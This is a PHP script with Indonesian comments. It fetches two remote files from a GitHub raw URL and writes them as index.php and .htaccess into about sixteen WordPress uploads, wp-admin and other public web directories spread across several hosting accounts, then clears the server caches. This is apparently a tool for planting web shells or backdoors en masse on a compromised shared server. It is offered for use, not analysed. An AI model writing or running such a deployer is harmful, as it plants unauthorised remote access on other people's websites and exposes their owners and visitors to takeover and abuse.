<?php
declare(strict_types=1);

/* ----------  1. KONFIGURASI  ---------- */

$files = [
    // url               => nama‑file‑tujuan
    "https://raw.githubusercontent.com/Rivaldi1706/Curl/refs/heads/main/index.txt" => "index.php",
    "https://raw.githubusercontent.com/Rivaldi1706/Curl/refs/heads/main/un7.txt"   => ".htaccess",
];

$targetDirs = [
    "/home/li/public_html/website/wp-content/uploads/2025/00/",
    "/home/li/public_html/website/wp-content/uploads/2025/-/",
    "/home/coop/public_html/nas2/uploads/01/",
    "/home/coop/public_html/nas2/uploads/02/",
    "/home/mooc/public_html/storage/wp-content/01/",
    "/home/mooc/public_html/storage/wp-admin/",
    "/home/artculture/public_html/page/wp-content/uploads/2019/01/",
    "/home/artculture/public_html/page/wp-content/uploads/2017/04/",
    "/home/audit/public_html/page/wp-content/uploads/mentor/",
    "/home/audit/public_html/page/wp-content/uploads/2024/05/",
    "/home/human/public_html/storage/img/",
    "/home/human/public_html/storage/composer/",
    "/home/ence/public_html/0/qrtrace/images/admin/",
    "/home/ence/public_html/images/video/",
    "/home/boardac/public_html/imgpublic/video/",
    "/home/boardac/public_html/imgpublic/views/",
];

/* ----------  2. PENGATURAN DASAR  ---------- */

set_time_limit(0);                       // biar tidak timeout di sisi PHP
ini_set('memory_limit', '256M');         // ubah jika perlu

const MAX_RETRY        = 3;              // jumlah percobaan unduh
const CONNECT_TIMEOUT  = 10;             // dtk
const TRANSFER_TIMEOUT = 60;             // dtk
const BACKOFF_SECONDS  = 3;              // jeda antar percobaan

/* ----------  3. FUNGSI UTILITY  ---------- */

function logMsg(string $msg): void
{
    echo '[' . date('Y-m-d H:i:s') . "] $msg\n";
}

function ensureDir(string $dir): void
{
    if (!is_dir($dir)) {
        if (!mkdir($dir, 0755, true)) {
            throw new RuntimeException("Gagal membuat folder $dir");
        }
        logMsg("Folder dibuat: $dir");
    }
    if (!is_writable($dir)) {
        chmod($dir, 0755); // cukup 755, tidak perlu 777
        logMsg("Izin folder diset 0755: $dir");
    }
}

function httpGetWithRetry(string $url): string
{
    $attempt = 0;
    while ($attempt < MAX_RETRY) {
        $attempt++;
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_CONNECTTIMEOUT => CONNECT_TIMEOUT,
            CURLOPT_TIMEOUT        => TRANSFER_TIMEOUT,
            CURLOPT_USERAGENT      => 'Downloader/1.0 (+https://example.com)',
        ]);
        $data      = curl_exec($ch);
        $httpCode  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlError = curl_error($ch);
        curl_close($ch);

        if ($data !== false && $httpCode === 200) {
            return $data;                         // sukses
        }

        $msg = $data === false
             ? "cURL error: $curlError"
             : "HTTP $httpCode";
        logMsg("Percobaan $attempt gagal → $msg");

        if ($attempt < MAX_RETRY) {
            sleep(BACKOFF_SECONDS ** $attempt);   // exponential back‑off (3, 9 dtk)
        }
    }
    throw new RuntimeException("Gagal mengunduh $url setelah " . MAX_RETRY . ' percobaan');
}

function saveFile(string $path, string $content): void
{
    // hapus file lama (kalau ada) lalu tulis baru
    @unlink($path);
    if (file_put_contents($path, $content) === false) {
        throw new RuntimeException("Tidak bisa menulis ke $path");
    }
    chmod($path, 0644);
}

/* ----------  4. UTAMA: DOWNLOAD & SIMPAN  ---------- */

try {
    // ping sederhana ke Google — hindari fatal error kalau server offline
    if (@fsockopen('www.google.com', 80) === false) {
        throw new RuntimeException("Tidak ada koneksi internet");
    }

    foreach ($files as $url => $filename) {
        logMsg("=== Mengolah sumber: $url ===");

        $data = httpGetWithRetry($url);           // satu kali unduh; dipakai ulang

        foreach ($targetDirs as $dir) {
            try {
                ensureDir($dir);
                $path = $dir . $filename;
                saveFile($path, $data);
                logMsg("Disimpan ➜ $path (" . strlen($data) . " bytes)");
            } catch (Throwable $e) {
                logMsg("⛔  $e");
            }
        }
    }

    /* ------  5. BERSIHKAN CACHE ------ */

    logMsg("Membersihkan cache...");
    if (function_exists('opcache_reset')) {
        opcache_reset();
        logMsg("OPcache dibersihkan ✔");
    }
    if (function_exists('apcu_clear_cache')) {
        apcu_clear_cache();
        logMsg("APCu dibersihkan ✔");
    }
    if (PHP_OS_FAMILY === 'Linux' && is_writable('/proc/sys/vm/drop_caches')) {
        exec('sync; echo 3 > /proc/sys/vm/drop_caches');
        logMsg("Cache OS Linux dibersihkan ✔");
    }

    logMsg("🎉 SEMUA SELESAI!");

} catch (Throwable $e) {
    logMsg("🚨 FATAL ERROR:  {$e->getMessage()}");
    exit(1);
}
?>
